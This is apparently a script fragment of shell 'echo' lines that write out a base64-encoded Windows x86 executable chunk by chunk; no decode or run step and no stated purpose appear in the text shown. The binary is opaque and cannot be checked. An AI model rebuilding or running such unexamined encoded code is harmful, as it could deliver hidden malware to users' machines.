echo WlBS6JirAABYUOjhHAAAWgHQ6wroF6wAAGbHAAAA/3QkEOipqgAA/zQk6KGqAAD/
echo dCQE6JiqAAD/dCQI6I+qAAD/dCQM6IaqAACDxBxbwggAVVMxwFDo5aoAAIsdMIBB
echo AIP7AQ+FlAAAAP81qIBBAOhObwAAicMh234q/zWogEEA6EdvAAD/NaiAQQDoUW8A
echo AAnAdBCLLayAQQD/dQjoxHIAAOvh/zWggEEA6BNvAACJBCSLHCQh235EaAUAAABo
echo AAAAAGgBAAAA/zWggEEA6Fw6AAD/NaCAQQDo7m4AAP81oIBBAOj4bgAACcB0EIst
echo pIBBAP91DOg2GwAA6+G4AQAAAOsCMcCDxARbXcNTMcBQUOgpqgAA/3QkGOgAHAAA
echo i1QkFI0MJOi0GgAA/3QkEDHbOxwkdSRS6MOoAABaUFLou6gAAFpQ6ClyAACNRCQM
echo UOjqqAAA6TkCAAC7AQAAADscJHUjixV4gEEAUuiPqAAAWlBS6CeqAACNRCQMUOi9
echo qAAA6QwCAAC7AgAAADscJHUpUuhoqAAAWlBS6GCoAABaUGgEAAAA6A5yAACNRCQM
echo UOiKqAAA6dkBAAC7AwAAADscJHUpUug1qAAAWlBS6C2oAABaUGgAAAAA6NtxAACN
echo RCQMUOhXqAAA6aYBAAC7BAAAADscJHUpUugCqAAAWlBS6PqnAABaUGgDAAAA6Khx
echo AACNRCQMUOgkqAAA6XMBAAC7BQAAADscJHUpUujPpwAAWlBS6MenAABaUGgIAAAA
echo 6HVxAACNRCQMUOjxpwAA6UABAAC7BgAAADscJHUpUuicpwAAWlBS6JSnAABaUGgH
echo AAAA6EJxAACNRCQMUOi+pwAA6Q0BAAC7BwAAADscJHUpUuhppwAAWlBS6GGnAABa
echo UGgGAAAA6A9xAACNRCQMUOiLpwAA6doAAAC7CAAAADscJHUpUug2pwAAWlBS6C6n
echo AABaUGgCAAAA6NxwAACNRCQMUOhYpwAA6acAAAC7CQAAADscJHUmUugDpwAAWlBS
echo 6PumAABaUGgBAAAA6KlwAACNRCQMUOglpwAA63e7CgAAADscJHVOUujTpgAAWlBS
echo 6MumAABaULgkcEEAUP90JBDoj1sAAI1EJAxQ6PCmAACLVCQIMcnoRRkAAHUMaAEA
echo AADoSx0AAOsKaAAAAADotuf//+sfUuiFpgAAWlBS6H2mAABaUOjrbwAAjUQkDFDo
echo rKYAAFiLVCQEUuhhpgAAWlBS6PmnAABYUOhCGQAAWgHQ6wroeKgAAGbHAAAA/3Qk
echo BOgKpwAA/zQk6AKnAACDxAhbwggAU7oMAAAAg+wExwQkAAAAAEp18+hTpwAAuJVw
echo QQCjNIBBAMcEJAAAAADrALgIAAAAOwQkfGShNIBBAA++AIlEJAT/BTSAQQBS6N6l
echo AABaUFLo1qUAAFpQi1wkDGvb/1PoByUAAI1EJAxQ6P2lAACLVCQMUuizpQAAWlBS
echo 6EunAACLVCQMUuhBpwAAjUQkEFDo16UAAP8EJHGSUuiMpQAAWlBS6ISlAABaUFLo
echo fKUAAFpQUuh0pQAAWlBoAQAAAP81SIBBAOjilwAA6F8YAAABFCTohSUAAI1EJBRQ
echo 6IulAABS6EWlAABaUFLoPaUAAFpQUug1pQAAWlBS6C2lAABaUGgDAAAA/zVIgEEA
echo 6JuXAADoGBgAAAEUJOg+JQAAjUQkGFDoRKUAAFLo/qQAAFpQUuj2pAAAWlBS6O6k
echo AABaUFLo5qQAAFpQaAMAAAD/dCQk6FaXAADo0xcAAAEUJOj5JAAAjUQkHFDo/6QA
echo AFLouaQAAFpQUuixpAAAWlBS6KmkAABaUFLooaQAAFpQaAMAAAD/dCQs6BGXAADo
echo jhcAAAEUJOi0JAAAjUQkIFDouqQAAFLodKQAAFpQUuhspAAAWlBS6GSkAABaUFLo
echo XKQAAFpQaAMAAAD/dCQw6MyWAADoSRcAAAEUJOhvJAAAjUQkJFDodaQAAFLoL6QA
echo AFpQaAEAAAD/dCQo6HYCAADoOhcAAFLoFKQAAFpQaAAAAAD/dCQc6FsCAACNBVyA
echo QQBQ6DikAABS6PKjAABaUGgAAAAA/3QkIOg5AgAAjUQkKFDoGKQAAFLo0qMAAFpQ
echo aAAAAAD/dCQk6BkCAACNRCQsUOj4owAAUuiyowAAWlBoAAAAAP90JBjo+QEAAI1E
echo JDBQ6NijAABS6JKjAABaUFLoiqMAAFpQUuiCowAAWlD/NXCAQQDo7/D//+hwpQAA
echo uGBwQQBQ/3QkNOhjFgAAAVQkCOgoKwAAjUQkKFDojqMAAFLoSKMAAFpQUuhAowAA
echo WlBS6DijAABaUP81YIBBAOil8P//6CalAAC4LnBBAFD/dCQ06BkWAAABVCQI6N4q
echo AACNRCQoUOhEowAAUuj+ogAAWlCLVCQQUujyogAAWlBS6IqkAAC6ZnBBAFLof6QA
echo AItUJCxS6HWkAACLVCQ0UuhrpAAAi1QkMFLoYaQAAOi8pAAA/zVAgEEA6LMVAAAB
echo VCQE6DTo///owxUAADHA/3QkEOhoowAA/3QkDOhfowAA/3QkHOhWowAA/3QkIOhN
echo owAA/3QkKOhEowAA/3QkGOg7owAA/3QkLOgyowAA/3QkFOgpowAA/3QkCOggowAA
echo /3QkJOgXowAAg8QwW8NVUzHAUOh4owAAi1QkEI0MJOgMFAAA/zQk/zW4gEEA6Eti
echo AACJxYtdAIP7AX1Z/zQk/zW4gEEA6DNiAACJxcdFAAEAAAD/NaCAQQDoZmgAAIsU
echo JFLo6aEAAFpQUuiBowAAiy2kgEEAjUUMUOgSogAA/zWMgEEAWIlFCIsdjIBBAEOJ
echo HYyAQQAxwP80JOiBogAAg8QEW13CBABTMcBQUFBQ6N2iAAD/dCQg6LQUAACLVCQY
echo jQwk6GgTAABoCgAAAP90JAT/NVSAQQDo0BMAAIlEJASDfCQEAA+EmAAAAP90JAT/
echo NVSAQQDojun//4lEJAj/dCQI6LgJAACjIIBBAP81SIBBAP81IIBBAP90JBDojdT/
echo /4tcJByD+wF1IqEggEEAmVJQ/3QkEP81YIBBAOiOCQAA/3QkCOgGXgAA61VS6P6g
echo AABaUFLo9qAAAFpQaAIAAAD/NSCAQQD/dCQY6BBfAACNRCQQUOgWoQAA/3QkCOjN
echo XQAAi1QkDFLow6AAAFpQUuhbogAAWFDopBMAAFoB0OsK6NqiAABmxwAAAP80JOht
echo oQAA/3QkDOhkoQAAg8QQW8IIAFO6DwAAAIPsBMcEJAAAAABKdfPotaEAALiecEEA
echo ozSAQQDHBCQAAAAA6wC4GQAAADsEJHxkoTSAQQAPvgCJRCQE/wU0gEEAUuhAoAAA
echo WlBS6DigAABaUItcJAxr2/9T6GkfAACNRCQMUOhfoAAAi1QkDFLoFaAAAFpQUuit
echo oQAAi1QkDFLoo6EAAI1EJBBQ6DmgAAD/BCRxkrgCcUEAozSAQQDHBCQAAAAA6wC4
echo AgAAADsEJHxkoTSAQQAPvgCJRCQE/wU0gEEAUui/nwAAWlBS6LefAABaUItcJAxr
echo 2/9T6OgeAACNRCQMUOjenwAAi1QkEFLolJ8AAFpQUugsoQAAi1QkDFLoIqEAAI1E
echo JBRQ6LifAAD/BCRxkrgHcUEAozSAQQDHBCQAAAAA6wC4AwAAADsEJHxkoTSAQQAP
echo vgCJRCQE/wU0gEEAUug+nwAAWlBS6DafAABaUItcJAxr2/9T6GceAACNRCQMUOhd
echo nwAAi1QkFFLoE58AAFpQUuiroAAAi1QkDFLooaAAAI1EJBhQ6DefAAD/BCRxkrgF
echo cUEAozSAQQDHBCQAAAAA6wC4AQAAADsEJHxkoTSAQQAPvgCJRCQE/wU0gEEAUui9
echo ngAAWlBS6LWeAABaUItcJAxr2/9T6OYdAACNRCQMUOjcngAAi1QkGFLokp4AAFpQ
echo UugqoAAAi1QkDFLoIKAAAI1EJBxQ6LaeAAD/BCRxkrjbcEEAozSAQQDHBCQAAAAA
echo 6wC4DQAAADsEJHxkoTSAQQAPvgCJRCQE/wU0gEEAUug8ngAAWlBS6DSeAABaUItc
echo JAxr2/9T6GUdAACNRCQMUOhbngAAi1QkHFLoEZ4AAFpQUuipnwAAi1QkDFLon58A
echo AI1EJCBQ6DWeAAD/BCRxkrjpcEEAozSAQQDHBCQAAAAA6wC4DgAAADsEJHxooTSA
echo QQAPvgCJRCQE/wU0gEEAUui7nQAAWlBS6LOdAABaUItcJAxr2/9T6OQcAACNRCQM
echo UOjanQAAixU4gEEAUuiOnQAAWlBS6CafAACLVCQMUugcnwAAjQU4gEEAUOiwnQAA
echo /wQkcY64+HBBAKM0gEEAxwQkAAAAAOsAuAkAAAA7BCR8aKE0gEEAD74AiUQkBP8F
echo NIBBAFLoNp0AAFpQUugunQAAWlCLXCQMa9v/U+hfHAAAjUQkDFDoVZ0AAIsViIBB
echo AFLoCZ0AAFpQUuihngAAi1QkDFLol54AAI0FiIBBAFDoK50AAP8EJHGOuJBwQQCj
echo NIBBAMcEJAAAAADrALgEAAAAOwQkfGihNIBBAA++AIlEJAT/BTSAQQBS6LGcAABa
echo UFLoqZwAAFpQi1wkDGvb/1Po2hsAAI1EJAxQ6NCcAACLFWSAQQBS6IScAABaUFLo
echo HJ4AAItUJAxS6BKeAACNBWSAQQBQ6KacAAD/BCRxjrgPcUEAozSAQQDHBCQAAAAA
echo 6wC4AwAAADsEJHxooTSAQQAPvgCJRCQE/wU0gEEAUugsnAAAWlBS6CScAABaUItc
echo JAxr2/9T6FUbAACNRCQMUOhLnAAAixVggEEAUuj/mwAAWlBS6JedAACLVCQMUuiN
echo nQAAjQVggEEAUOghnAAA/wQkcY6LFWCAQQBS6NCbAABaUFLoaJ0AAItUJBhS6F6d
echo AACNBWCAQQBQ6PKbAABS6KybAABaUP90JBj/dCQY6JLv//+NRCQkUOjTmwAA6GxV
echo AACJRCQkaAAAAADodg0AAKNUgEEAUuh1mwAAWlBS6G2bAABaUFLoZZsAAFpQUuhd
echo mwAAWlBoAQAAAP81SIBBAOjLjQAA6EgOAAABFCTobhsAAI1EJCxQ6HSbAABS6C6b
echo AABaUFLoJpsAAFpQUugemwAAWlBS6BabAABaUGgBAAAA/3QkPOiGjQAA6AMOAAAB
echo FCToKRsAAI1EJCxQ6C+bAAD/dCQo6APr//+JRCQsUujcmgAAWlD/dCQw6PXd///o
echo 7A0AAOii1f///3QkLOhMAgAAUui4mgAAWlD/dCQQi1wkNIPDBFNY6CQNAABQ6Kvx
echo //+NBVCAQQBQ6NKaAAD/NVCAQQDoeg8AAP90JCzoPN3//1LoeJoAAFpQUuhwmgAA
echo WlD/NVCAQQDo3ef//+henAAA/3QkJOhXDQAAAVQkBOiMVAAA6GcNAACLFSyAQQBS
echo 6DuaAABaUFLo05sAAIsVYIBBAFLox5sAAI0FYIBBAFDoW5oAAFLoFZoAAFpQ/3Qk
echo KOjf2f//jUQkNFDoQJoAAOjQ8///ixVAgEEAUujvmQAAWlBS6IebAACNRCQ4UOgd
echo mgAA/3QkNOi7DgAAi1QkNFLoypkAAFpQUuhimwAAuipwQQBS6FebAACLVCQ0UuhN
echo mwAAjUQkNFDo45kAAP90JDDogQ4AAIsdaIBBAIP7AXUYi0QkKFCNBaksQABQ6JAP
echo AACjGIBBAOsJ/3QkKOiX5///UuhomQAAWlCLVCQcUuhcmQAAWlBS6PSaAAC6KnBB
echo AFLo6ZoAAItUJDhS6N+aAADoOpsAAFLoNJkAAFpQUugsmQAAWlDommIAAOggmwAA
echo i1QkLFLoFpkAAFpQUuiumgAAi1QkIFLopJoAAOgBDAAAARQk6PkLAAABVCQE6PAL
echo AAABVCQI6Ifa///oAAwAAIlEJDj/dCQ46PzZ//8xwP90JCjomJkAAP90JDDoj5kA
echo AP90JAzohpkAAP90JBDofZkAAP90JAjodJkAAP90JBToa5kAAP90JDToYpkAAP90
echo JCDoWZkAAP90JBzoUJkAAP90JBjoR5kAAIPEPFvDUzHAUFBQUFDopZkAALi4cEEA
echo ozSAQQDHBCQAAAAA6wC4GwAAADsEJHxkoTSAQQAPvgCJRCQE/wU0gEEAUugwmAAA
echo WlBS6CiYAABaUItcJAxr2/9T6FkXAACNRCQMUOhPmAAAi1QkDFLoBZgAAFpQUuid
echo mQAAi1QkDFLok5kAAI1EJBBQ6CmYAAD/BCRxklLo3pcAAFpQ/3QkEP90JCRY6E4K
echo AABQ6NXu//+NRCQUUOj+lwAA/3QkEOiPYgAAMcD/dCQM6HqYAAD/dCQI6HGYAAD/
echo dCQQ6GiYAACDxBRbwgQA/3QkBOhoVAAA6wIxwMIEAFNXMcBQUFBQUOizmAAAi1Qk
echo II0MJOhHCQAAix1MgEEAg/sBdBP/NCTob93//yHAdAe4AQAAAOsCMcAhwHQF6Z4A
echo AAD/NCRo/////+iBZQAAiUQkBIN8JAQAdH7/dCQs/3QkLFtfg/8Afwt8BYP7AHcE
echo McDrBbgBAAAACcB0HYtEJChQ/3QkKP90JAzoIWgAAJlSUI9EJAyPRCQM/3QkBOgt
echo YgAA/3QkDP90JAxbXztcJCh1Bjt8JCx0BDHA6wW4AQAAAAnAdArHRCQQAQAAAOsI
echo x0QkEAAAAACLRCQQ6wIxwP80JOholwAAg8QUX1vCEAAAAAAAAAAAAAAAAAAAAAAA
echo vQAAAACcWL0AAAAAicE1AAAgAFCdnFgxyHQ+uAEAAAAPoonQJQAAgAB0LoPNAonQ
echo JQAAAAJ0D4PNCInQJQAAAAR0A4PNELgBAACAD6KJ0CUAAACAdAODzQSJ6MPMzMzM
echo UlHoeZAAAMNSUejBkAAAw/8lcHRBAP8ltHRBAP8luHRBAP8lvHRBAP8lwHRBAP8l
echo xHRBAP8lyHRBAP8lzHRBAP8l0HRBAP8l1HRBAP8l2HRBAP8l3HRBAP8l4HRBAP8l
echo 5HRBAP8l6HRBAP8l7HRBAP8l8HRBAP8l9HRBAP8l+HRBAP8l/HRBAP8lAHVBAP8l
echo BHVBAP8lCHVBAMzMzMzMzA+/AMPMzMzMzMzMzMzMzMyLVCQEiRDCBADMzMzMzMzM
echo CdJ1BbpscEEACcl1BblscEEAU2aLAoPCAmaLGYPBAmY52HUOZgnAdepbuAEAAACF
echo wMNbMcCFwMPMzMzMzMzMzFL/dCQI6NaVAABawgQAzMxSUf81eHFBAOjSAQAAiwBZ
echo WsNQ/zV4cUEA6MEBAACLEFjDzMzMzMzMzMzMzMzMzMxQUv90JAzo1ZUAAFpYwgQA
echo V1ZTMf+LRCQUCcB9FEeLVCQQ99j32oPYAIlEJBSJVCQQi0QkHAnAfRRHi1QkGPfY
echo 99qD2ACJRCQciVQkGAnAdRiLTCQYi0QkFDHS9/GJw4tEJBD38Yna60GJw4tMJBiL
echo VCQUi0QkENHr0dnR6tHYCdt19Pfxicb3ZCQcicGLRCQY9+YBynIOO1QkFHcIcgc7
echo RCQQdgFOMdKJ8E91B/fa99iD2gBbXl/CEAAAAMzMzMxWi0QkFAvAdSiLTCQQi0Qk
echo DDPS9/GL2ItEJAj38Yvwi8P3ZCQQi8iLxvdkJBAD0etHi8iLXCQQi1QkDItEJAjR
echo 6dHb0erR2AvJdfT384vw92QkFIvIi0QkEPfmA9FyDjtUJAx3CHIPO0QkCHYJTitE
echo JBAbVCQUM9srRCQIG1QkDPfa99iD2gCLyovTi9mLyIvGXsIQAP8ldHRBAP8leHRB
echo AP8lfHRBAP8lgHRBAP8lhHRBAP8liHRBAP8ljHRBAP8lkHRBAP8llHRBAP8lmHRB
echo AP8lnHRBAP8loHRBAP8lpHRBAP8lqHRBAP8lrHRBAP8lkHVBAP8lYHZBAP8lhHZB
echo AP8liHZBAP8ljHZBAP8lkHZBAP8llHZBAFe/qIZBAFf/FQx1QQChxIBBAIXAdCNW
echo jXAI/zb/FRB1QQBWaMSAQQDojIcAAKHEgEEAWVmFwHXfXlf/FRR1QQBfw2iohkEA
echo /xUYdUEAw/90JAToGgAAAIXAdBFqAFD/FRx1QQD32BvA99jrAjPAwgQAU1ZXu6iG
echo QQAz/1P/FQx1QQCLNcSAQQCF9nQii0QkEDlGDHQIizaF9nX16xFX/3YI/xUcdUEA
echo hcB0A4t+CFP/FRR1QQCLx19eW8IEAFNWV4t8JBBqAFfopf///1D/FSB1QQC7qIZB
echo AFP/FQx1QQCLNcSAQQDrBzl+DHQIizaF9nX16xiDxgj/Nv8VEHVBAFZoxIBBAOiv
echo hgAAWVlT/xUUdUEAX15bwgQAUVVWjUQkCDP2UFb/dCQc/3QkHGgAEAAAVv8VJHVB
echo AIvohe10c1doqIZBAP8VDHVBAIs9xIBBAIX/dDFTVo1fCP8z/xUcdUEAhcB1Gf8z
echo /xUQdUEAiz9TaMSAQQDoP4YAAFlZ6wKLP4X/ddFboRRxQQCL8EBqEGjEgEEAoxRx
echo QQDoW4YAAFlZaKiGQQCJKIlwBP8VFHVBAF+Lxl5dWcIIAIM9yIBBAAB1EmoB/xVw
echo dkEAxwXIgEEAAQAAAP8lKHVBAFaLdCQIV78cAQAAV2oAVugJ+///g8QMiT5oADBB
echo AP8VtHRBAIXAdBpoFDBBAFD/FSx1QQCFwHQKVv/Q99gbwEDrAjPAX17DgexMAwAA
echo U1VWV41EJBDHRCQQFAEAAFC+yAAAADPbM///FTB1QQCFwA+EKgEAAItEJCBID4QC
echo AQAASA+FGAEAAI2EJCQBAAAz7VDoav///1mFwHQYi5wkKAEAAIu8JCwBAACAvCQ+
echo AgAAAestjYQkQAIAAMeEJEACAAAcAQAAUP8VMHVBAIXAdBWLXCQUi3wkGIC8JFoD
echo AAABdQMz7UWD6wMPhJAAAABLD4SFAAAAS3RhS3QYg+sED4WbAAAAhf8PhZMAAABq
echo bumLAAAAg+8AdDNPdCJPdBFPdX6L9ffeG/aD5vuDxmnrcIv1994b9oPm+4PGX+ti
echo i/X33hv2g+b7g8ZV61SL9ffeG/aD5vuDxkvrRoPvAHQYT3QRT3U7i/X33hv2g+b7
echo g8ZB6y1qPOsoajLrJGoU6yBqBesci0QkGIXAdBKD+Ap0CYP4WnULaijrBmoe6wJq
echo Cl5fi8ZeXVuBxEwDAADDzFVWi3QkDFeF9nUFviQwQQBqAGoAagBqAGr/VmoAaOn9
echo AAD/FTR1QQCL6FXocEQAAIv4hf90FmoAagBVV2r/VmoAaOn9AAD/FTR1QQCLx19e
echo XcIEAMzMzMzMzMzMzMzMzItEJARXM/+FwHR4i1QkDIXSdHBVD7cqZoXtdGAPtwhm
echo hcl0WFNWg8ACZjvNdT2NSgKL2A+3EGaF0nQh6wONSQAPtzFmhfZ0GmY71nUPD7dQ
echo AoPAAoPBAmaF0nXkZoM5AHUDR+sCi8OLVCQYD7cIZoXJdbNeW12Lx1/CCABdi8df
echo wggAi8dfwggAzMzMzMzMzFGLVCQMVTPtg/oBD4wOAQAAU1aLdCQUV4X2dQW+JDBB
echo AItMJCCFyXUJuSQwQQCJTCQgD7cBM/+JRCQQi96JXCQYZoXAdFxmOXkCdFaL2Y1T
echo AmaLA4PDAmaFwHX1K9rR+1NRVuid+v//g8QMhcB0DmY5LnQJi0wkIIPGAuvjRzt8
echo JBx0EmY5LnREi0wkII00Xol0JBjryotcJBiL7ivr0f3rL4tMJBAPtwZmO8F0BWaF
echo wHUNRzv6dA1mhcB0FI1eAoPGAuvhi+4r69H96wSLXCQYVugZiQAAi3QkJIv4hf90
echo GFboWYkAAI0MbQAAAABRU1DoFfr//4PEDFZV6HCJAACL8IX/dQtVU1boA/r//4PE
echo DF8zwGaJBG5eW11ZwhAA/3QkGOgoigAAXVnCEADMzMyLTCQEhckPhIEAAABXi3wk
echo DIX/dHJmgzkAdGxmgz8AdGaLVCQQSlOL2YXSfhhWM/ZmgzkAdA6DxgKDwQKLxtH4
echo O8J87F4ry9H5hdJ5BDPS6wY70X4Ci9H2RCQYAY0EU1dQdAfo6AwAAOsF6Hj5//+D
echo xAiFwHQKK8PR+FtAX8IQAFszwF/CEAAzwF/CEAAzwMIQAMzMzMzMzMzMzMzMzMzM
echo agBqAf90JBD/dCQQ6E/////CCADMzMzMzMzMzMzMzMxWV4t8JAwzyTP2hf8PhCMB
echo AAAPtweD+CB0BYP4CXUFg8cC6+4PtwdTVYP4LXUFjWjU6wcz7YP4K3UDg8cCD7cf
echo g/skdXAPt0cCg8cCg/gwcgWD+Dl2HIP4QXIFg/hGdhKD+GEPgr8AAACD+GYPh7YA
echo AACD+DByGYP4OXcUg+kDmYPeAA+kzgTB4QQDyBPy67UPpM4EweEEg/hhmXIMA8gT
echo 8oPpV4PeAOucA8gT8oPpN4PeAOuQg/sldTQPt0cCg8cCg/gwcmJmg/gxd1yD6RgP
echo t8CZg94AD6TOAQPJA8gPt0cCE/KDxwKD+DBz2us6g/swcjVmg/s5dy+LwYvWD6TC
echo AsHgAgPID7fDD7dfAhPymQ+kzgEDyQPIE/KD6TCD3gCDxwKD+zBzy4XtXVt0B/fZ
echo g9YA995fi9aLwV7CBADMzFNVVot0JBBXVuiyAgAAM8mL+ItEJBiL34XAD5jBSSPI
echo O/l+AovZVuiUhgAA/3QkHIlEJBhT6AaHAACL6ItEJBSFwHQIUOgGiAAAi/CF9nQU
echo K/tTjQR+UFXoI4gAAF9eXVvCDABfM8BeZolFAF1bwgwAzMzMzMzMzMzMzMzMzMzM
echo g+wMU1VWV4t8JCCF/3QWi9+NSwJmiwODwwJmhcB19SvZ0fvrAjPbV+gThgAAi3Qk
echo JFaJRCQk6AWGAAD/dCQ0iUQkKFPod4YAAIvoi0QkIIXAdAhQ6HeHAACL+ItEJCSF
echo wHQIUOhnhwAAi/CJbCQYhf8PhF0BAABmgz8AD4RTAQAAhfYPhDABAABmgz4AD4Qm
echo AQAAi86JfCQUjVECjWQkAGaLAYPBAmaFwHX1K8rR+YN8JCQAiUwkIHQ6jQRNAgAA
echo AFBqAP81EIBBAP8VOHVBAIvQiUQkECvW6waNmwAAAAAPtw6NdgJmiUwy/maFyXXw
echo i/DrCItEJCyJRCQQ9kQkKAHHRCQ0DVNAAHUIx0QkNPVSQACLRCQsg/gBfh1IUFdV
echo 6Dz2//+LRCQ4g8QMjWxFAI08R4PF/oPH/maDPwB0RotEJCBQVlf/VCRAg8QMhcB1
echo T4tEJCCLTCQwjTxHg/n/dFBJiUwkMIXJf0eLx4vzK0QkFNH4K/BWV1Xo4/X//4PE
echo DI1sdQCDfCQkAHRI/3QkEGoA/zUQgEEA/xU8dUEA6zRmiwdmiUUAg8UCi0QkIIPH
echo AmaDPwB1jOvMi80rz41JAA+3B41/AmaJRDn+ZoXAdfCNbF0Ai8UrRCQY0fgr2FPo
echo bIYAAF8zwF5miUUAXVuDxAzCGADMzMzMzMzMzMzMzMz/dCQMav9qAWoA/3QkGP90
echo JBjo6f3//8IMAMzMzMzMzP90JAhqAeiVhAAAZotMJARmiQgzyWaJSALCCADMzMzM
echo i0QkBIXAdBqNUALrA41JAGaLCIPAAmaFyXX1K8LR+MIEADPAwgQAzMzMzMzMzMzM
echo UVNVVot0JBRXhfZ1Bb4kMEEAi/6NTwJmiweDxwJmhcB19Sv50f9WiXwkFOiggwAA
echo /3QkHIvoV+gUhAAAi9iF/3RKhe10CFXoFIUAAIvwjVf/jRRWjUf/jQRDO/J3Lovr
echo K+4rwolEJBiL+I2bAAAAAGaLAg+3DmaJBC6DxgJmiQwXg+oCO/J26It8JBAzwGaJ
echo BHtfXl1bWcIIAMzMzMzMzFNWi3QkDFdW6CP///9Wi/joG4MAAP90JBSL2Ffoj4MA
echo AIv4hdt0CFPok4QAAIvwhfZ0KovPK87rB42kJAAAAAAPtwaNdgJmiUQx/maFwHXw
echo V/8VyHVBAF9eW8IIADPAZokHX15bwggAzMzMzMzMzMxTVVZXi3wkFFfosv7//zPJ
echo i/CLRCQYhcAPmMFJI8g78X4Ci/FX6JaCAAD/dCQci+hW6AqDAACL2IXtdAhV6A6E
echo AACL+IX/dBOF9n4PVldT6CyEAABfXl1bwgwAX14zwF1miQNbwgwAzMzMzMzMzMzM
echo i0QkCFNVVle/IAAAAIXAdAMPtziLdCQUVugy/v//i+iF9nRUD7cOi947z3UOjUkA
echo D7dGAoPGAjvHdPUr89H+O/V9LY0UbQAAAACNS/4Dyg+3ATvHdQsPt0H+g+kCO8d0
echo 9SvRjUP+A8LR+APGK+jrDjPAi8Yr6OsGi3QkGDPbU+jMgQAA/3QkHIlEJBxV6D6C
echo AACL+ItEJBiFwHQIUOg+gwAAi9iF23QSVY0Ec1BX6F2DAABfXl1bwgwAM8BmiQdf
echo Xl1bwgwAzMzMzMzMzMzMzP90JAhoKDBBAP90JAzoHv///8IIAMzMzMzMzMzMzMzM
echo i0QkDFMz24XAVVaLdCQQD5jDV0tWI9joRIEAAP90JCCL6FPouIEAAIv4he10CFXo
echo vIIAAIvwhfZ0PYtMJBiD+QF+D2aDPgB0LkmDxgKD+QF/8Q+3DmaFyXQdK/eNZCQA
echo hdt0E2aJD0sPt0Q+AoPHAovIZoXAdelT6POCAAAzwGaJB19eXVvCEADMzMzMzMzM
echo i1QkBIXSdC6LwlaNcAKL/2aLCIPAAmaFyXX1i0wkDCvG/3QkENH4K8FAUFFS6D7/
echo //9ewgwA/3QkDOjxgQAAwgwAzMzMzMzMzMzMzMzMzMyLRCQIV4t8JAiLz4HBAAAA
echo gIPQAIXAdxhyBYP5/3cR/3QkEFfoVwAAAIPECF/CDABW/3QkFGpA6MSAAAD/dCQQ
echo i/BXVugjuAAAjU4CjWQkAGaLBoPGAmaFwHX1K/G4QAAAANH+K8ZQ6CSCAABeX8IM
echo AMzMzMzMzMzMzMzMzMzMzIPsEFVW/3QkIGog6HCAAACLTCQci/CL7oXJdRC4MAAA
echo AGaJBoPGAumWAAAAeTm4LQAAAGaJBoPGAoH5AAAAgHUkuSwwQQCL1ivRjZsAAAAA
echo D7cBjUkCZolECv5mhcB18IPGFOtd99lXM/+FyXRTU5C4Z2ZmZovZ9+lHwfoCi8rB
echo 6R8DyorBiUwkJMDgAgLIAskq2YtMJCSAwzCIXDwQhcl1zluF/34a6weNpCQAAAAA
echo Zg++RDwMT2aJBoPGAoX/f+9fi864IAAAACvN0fkrwVDoO4EAADPAZokGXl2DxBDD
echo i0QkBFP/dCQMM9uFwA+Yw0sj2FPoh38AAIvQhdt0HleLy7ggACAA0emL+vOrE8lm
echo 86szwF9miQRaW8IIADPAZokCW8IIAMzMzMzMzMzMzMyD7CBTVTPtVlc5bCQ0dQjH
echo RCQ0JDBBAItcJDiF23UJuyQwQQCJXCQ4OWwkPHUIx0QkPCQwQQCLVCRAuQ1TQACL
echo woPgAYlEJBR1Bbn1UkAAiUwkQDlsJER/CMdEJEQBAAAAi/ONfgJmiwaDxgJmhcB1
echo 9Sv3i3wkPNH+jUcCiUQkEGaLB4PHAmaFwHX1K3wkENH/iXwkEPbCAg+EigAAAIX2
echo D4RUAgAAi0QkSIXAD4RIAgAAi3wkRItUJDRPjTx6i99mOSsPhDECAACNpCQAAAAA
echo g/j/dAg7xQ+OHQIAAFb/dCQ8V//Rg8QMhcB1Hv90JBD/dCRAV+j37v//i0QkHI0c
echo c4PEDEWNPEfrBoPHAoPDAmaDOwCLRCRIi0wkQHWyX15dW4PEIMIcAItUJDRS6J59
echo AACJRCQkhcB0EP90JDTowO7//4PEBIlEJDRT6IB9AACJRCQohcB0D1Pope7//4vY
echo g8QEiVwkOP90JDzoYH0AAIlEJCyFwHQQ/3QkPOiC7v//g8QEiUQkPItEJESLVCRI
echo jQwAi0QkNIPA/olMJBwDwYlEJCCLyIlMJBiF0nQzD7cBZoXAdCuL+YN8JBQAdXZm
echo OwN1DlZTV/9UJEyDxAyFwHRxg8cCD7cHZoXAdduLfCQQi1wkNIvLjVECjZsAAAAA
echo ZosBg8ECZoXAdfX/dCRMK/4ryg+v/dH5A/lX6EB9AACL+IXtdUOLyyv7jZsAAAAA
echo D7cBjUkCZolED/5mhcB18OmPAAAAVlNX/1QkTIPEDIXAdY+LVCRIjTx3RYP6/3SF
echo O9V+iel8////i0QkRIP4AX4bUP90JDhX6ITt//+LRCQog8QMi1wkIIPA/gP4D7cL
echo ZoXJdDaF7X4eg3wkFAB1dItEJDhmOwh1DlZQU/9UJEyDxAyFwHRuZosDZokHg8cC
echo g8MCD7cLZoXJdcqLXCQ0M8BmiQeDfCQkAHQJU+g47f//g8QEg3wkKAB0DP90JDjo
echo Je3//4PEBIN8JCwAdAz/dCQ86BLt//+DxARfXl1bg8QgwhwAVv90JDxT/1QkTIPE
echo DIXAdZL/dCQQ/3QkQFfozuz//4tEJByNHHODxAxNjTxH64DMzMzMzMzMzMzMzMzM
echo /3QkEGr/agBqAP90JBz/dCQc/3QkHOil/P//whAAzMyD7BRTVYtsJCRWVw+3RQCD
echo xQKJbCQsZoXAD4TCAAAAiz3MdUEAUP/XD7fYjU0CiVwkHGaLRQCDxQJmhcB19It0
echo JCgr6dH9iWwkGI2bAAAAAA+3BoPGAmaFwA+EeAAAAFD/12Y7w3Xpi1QkLIvdi8qF
echo 7XRXi8YrwolEJBTrA41JAA+3LAgPtwGDwQJQiUwkFP/XVQ+3+P8VzHVBAA+3wCvH
echo dRhmhe10I0t0IIs9zHVBAItMJBCLRCQU68aLPcx1QQCLbCQYi1wkHOuGg+4CX4vG
echo Xl1bg8QUw19eXTPAW4PEFMOLdCQoi8ZfXl1bg8QUw8xWi3QkEIX2dQQzwF7Di0wk
echo CFOLXCQQK8tVV4lMJBSL/w+3A41bAg+3bBn+UP8VzHVBAFUPt/j/Fcx1QQAPt8Ar
echo x3UMZoXtdAeLTCQUTnXRX11bXsPMzMzMzMzMzMzMzMxXi3wkCIX/D4RbAgAAiweF
echo wA+EUQIAAFOLXCQUVoP7/3UMi08Ei3cQiUQkEOs2U1fonT0AAIt0JBxWV4lEJBjo
echo jj0AACvzi8hGg3wkEAAPhBICAACFyQ+ECgIAAINsJBAIg+kIi0QkEIlMJBiLGVWL
